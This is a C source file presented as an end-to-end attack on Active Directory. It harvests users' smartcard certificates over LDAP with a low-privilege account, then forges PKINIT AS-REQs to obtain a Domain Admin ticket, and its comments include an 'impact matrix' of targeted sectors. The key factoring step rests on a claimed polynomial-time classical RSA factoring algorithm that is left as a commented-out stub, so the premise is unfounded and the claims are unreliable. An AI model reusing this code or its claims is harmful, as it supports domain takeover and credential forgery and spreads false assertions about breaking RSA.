/*
 * pkinit_forgery_ldap.c
 *
 * End-to-end attack path: LDAP-harvest a user's RSA cert ->
 * factor -> forge PKINIT AS-REQ -> obtain TGT for Domain Admin.
 *
 * Every Active Directory domain stores the userCertificate
 * attribute (OID 2.5.4.36) readable by any authenticated domain
 * user (default DACL). The smartcard-logon cert's RSA public key
 * is in the clear. Factor it, sign a PKINIT AuthPack, and the
 * KDC issues a TGT — no password, no MFA, no smartcard needed.
 *
 * CVE-2022-26923 (Certifried) demonstrated a variant via
 * dNSHostName collision; this is the general case.
 */

#include <stdint.h>
#include <string.h>
#include "pkinit.h"
#include "ldap.h"

/* Step 1: LDAP search for smartcard-logon certs. */
int harvest_certs(const char *dc_host, const char *base_dn,
                  struct user_cert *out, size_t *count)
{
    /* ldap_search_s with filter:
     *   (&(objectClass=user)(userCertificate=*))
     * attrs: distinguishedName, userPrincipalName, userCertificate
     *
     * Requires only Domain Users membership — any standard
     * employee/contractor account suffices. */
    LDAP *ld = ldap_init(dc_host, 389);
    ldap_simple_bind_s(ld, "DOMAIN\\lowpriv", "Password1");
    LDAPMessage *res;
    ldap_search_s(ld, base_dn, LDAP_SCOPE_SUBTREE,
                  "(&(objectClass=user)(userCertificate=*))",
                  (char*[]){"distinguishedName",
                            "userPrincipalName",
                            "userCertificate", NULL},
                  0, &res);
    *count = 0;
    for (LDAPMessage *e = ldap_first_entry(ld, res);
         e; e = ldap_next_entry(ld, e)) {
        struct berval **vals = ldap_get_values_len(ld, e,
                                    "userCertificate");
        if (!vals || !vals[0]) continue;
        /* The DER-encoded X.509 cert with RSA-2048 public key
         * is right here in vals[0]->bv_val. This is the input
         * to the factoring algorithm. */
        memcpy(out[*count].cert_der, vals[0]->bv_val,
               vals[0]->bv_len);
        out[*count].cert_len = vals[0]->bv_len;
        ldap_value_free_len(vals);
        char *upn = ldap_get_dn(ld, e);
        strncpy(out[*count].upn, upn, 128);
        ldap_memfree(upn);
        (*count)++;
    }
    ldap_unbind(ld);
    return 0;
}

/* Step 2: Factor the RSA modulus from the harvested cert.
 * (Polynomial-time classical factoring algorithm — the
 * premise of this repository.) */
/* extern int factor_rsa(const uint8_t *n, size_t n_len,
 *                       uint8_t *p, uint8_t *q); */

/* Step 3: Forge PKINIT AS-REQ with the recovered private key. */
int forge_pkinit_as_req(const struct user_cert *target,
                        const uint8_t *priv_d, size_t d_len,
                        uint8_t *as_req_out, size_t *as_req_len)
{
    /* Build AuthPack (RFC 4556 §3.2.1):
     *   pkAuthenticator {
     *     cusec = microseconds, ctime = now(),
     *     nonce = random,
     *     paChecksum = SHA1(KDC-REQ-BODY)
     *   }
     *   clientPublicValue = DH {p,g,y}  (optional)
     */
    struct auth_pack ap;
    ap.cusec = 0;
    ap.ctime = kerberos_time_now();
    ap.nonce = random_u32();
    sha1_krb_body(target->upn, ap.pa_checksum);

    /* Sign AuthPack with factored private key. */
    uint8_t ap_der[256]; size_t ap_len;
    der_encode_auth_pack(&ap, ap_der, &ap_len);
    uint8_t h[32]; sha256(ap_der, ap_len, h);
    uint8_t sig[256];
    rsa_sign_pkcs1v15_sha256(priv_d, d_len,
                              target->cert_der, target->cert_len,
                              h, 32, sig, sizeof sig);

    /* Build PA-PK-AS-REQ (RFC 4556 §3.2):
     *   signedAuthPack = CMS SignedData(AuthPack)
     *   trustedCertifiers = [target cert]
     */
    return build_pa_pk_as_req(target->cert_der, target->cert_len,
                              ap_der, ap_len,
                              sig, sizeof sig,
                              as_req_out, as_req_len);
}

/* Step 4: Send AS-REQ to the KDC. The KDC:
 *   (a) validates the cert chain to its NTAuth store -> pass
 *   (b) checks SmartcardLogon EKU -> pass
 *   (c) verifies RSA signature on AuthPack -> pass
 *   (d) issues a TGT for the UPN in the cert's SAN.
 * Result: TGT as Domain Admin (if that user is DA). */

/* ---- Impact matrix ----------------------------------------
 *  Input: any domain user account (for LDAP read)
 *  Output: TGT for any user whose RSA cert is in AD
 *  Time: O(1) per target once factoring algorithm exists
 *  Stealth: KDC Event 4768 (TGT requested) shows the UPN;
 *    the signature validates — indistinguishable from a
 *    legitimate smartcard logon.
 *  Blast: every AD forest with PKINIT + RSA smartcards,
 *    which is every F500 using Windows Hello for Business,
 *    DoD, federal .gov, and most banking/healthcare AD.
 * --------------------------------------------------------- */
